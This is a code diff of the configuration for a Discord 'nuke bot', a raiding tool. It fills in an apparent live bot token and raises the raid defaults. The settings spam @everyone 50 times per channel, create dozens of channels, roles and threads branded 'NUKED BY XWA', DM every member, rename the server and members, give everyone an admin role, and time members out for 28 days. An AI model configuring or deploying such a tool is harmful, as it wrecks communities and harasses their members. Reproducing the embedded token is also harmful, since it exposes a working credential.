@@ -18,39 +18,39 @@ import random
 # CONFIG #
 class Config:
     # ===== BOT SETTINGS =====
-    TOKEN = ""  # Your bot token from Discord Developer Portal
+    TOKEN = "MTU1MjcyNjgzODU4Mzg5MDEyMg.GR3ahK.TK7EikaPQdZR91jZH2us5wlmvG0L6oakTBVIWs"  # Your bot token from Discord Developer Portal
     PREFIX = "!"  # The prefix to use before commands (e.g. !nuke), you can also delete the prefix if you don't want one
     WHITELIST = []  # List of user IDs who can use the bot commands, don't give any ids if you want anyone to use bot.
 
     # ===== MESSAGE SETTINGS =====
-    SPAM_MESSAGE = "@everyone"  # The message that will be spammed in channels
-    SPAM_COUNT = 10  # How many times to send the spam message in each channel
+    SPAM_MESSAGE = "@everyone NICE TO MEET Y'ALL, NUKED BY XWA"  # The message that will be spammed in channels
+    SPAM_COUNT = 50  # How many times to send the spam message in each channel
     TEXT_TO_SPEECH = False  # If true, messages will be read aloud by Discord's text-to-speech
-    DM_MESSAGE = "THE SERVER GOT NUKED"  # Message sent to all members via direct message
+    DM_MESSAGE = "THE SERVER GOT NUKED BY XWA"  # Message sent to all members via direct message
 
     # ===== CHANNEL SETTINGS =====
-    CHANNEL_NAME = "nuked"  # Base name for created text channels
-    CHANNELS_COUNT = 10  # How many text channels to create
-    NEW_CHANNEL_NAME = "nuked"  # Name pattern when renaming existing channels
+    CHANNEL_NAME = "NUKED BY XWA"  # Base name for created text channels
+    CHANNELS_COUNT = 50  # How many text channels to create
+    NEW_CHANNEL_NAME = "NUKED BY XWA"  # Name pattern when renaming existing channels
     VOICE_CHANNELS_COUNT = 10  # How many voice channels to create
-    VOICE_CHANNEL_NAME = "NUKED"  # Base name for created voice channels
-    CATEGORY_NAME = "NUKED"  # Base name for created categories
-    CATEGORIES_COUNT = 5  # How many categories to create
-    THREAD_COUNT = 5  # How many threads to create in each text channel
-    THREAD_NAME = "nuked"  # Base name for created threads
-    NSFW_CHANNEL_NAME = "nuked"  # Base name for NSFW channels
+    VOICE_CHANNEL_NAME = "NUKED BY XWA"  # Base name for created voice channels
+    CATEGORY_NAME = "NUKED BY XWA"  # Base name for created categories
+    CATEGORIES_COUNT = 50  # How many categories to create
+    THREAD_COUNT = 50  # How many threads to create in each text channel
+    THREAD_NAME = "nuked by xwa"  # Base name for created threads
+    NSFW_CHANNEL_NAME = "nuked by xwa"  # Base name for NSFW channels
     SLOWMODE_DURATION = 300  # Slowmode duration in seconds for all channels
 
     # ===== ROLE SETTINGS =====
-    ROLE_NAME = "nuked"  # Base name for created roles
+    ROLE_NAME = "XWANTED"  # Base name for created roles
     ROLES_COUNT = 10  # How many roles to create
-    NEW_ROLE_NAME = "nuked"  # Name pattern when renaming existing roles
-    ADMIN_ROLE_NAME = "ADMIN"  # Name of the admin role given to everyone
+    NEW_ROLE_NAME = "XWANTED"  # Name pattern when renaming existing roles
+    ADMIN_ROLE_NAME = "XWANTED"  # Name of the admin role given to everyone
 
     # ===== SERVER SETTINGS =====
-    SERVER_NAME = "NUKED SERVER"  # New name for the server
+    SERVER_NAME = "666 BY XWANTED"  # New name for the server
     SERVER_ICON_URL = "https://raw.githubusercontent.com/vn4thyt/vnsyt/refs/heads/main/Stuff/Discord%20Nuke%20Bot/server-icon.jpg"  # URL of new server icon
-    NICKNAME = "NUKED"  # New nickname for all members
+    NICKNAME = "NUKED BY XWA"  # New nickname for all members
     TIMEOUT_DURATION = 28  # Timeout duration in days for all members, anything above 28 will not work
 
     # ===== WEBHOOK SETTINGS =====
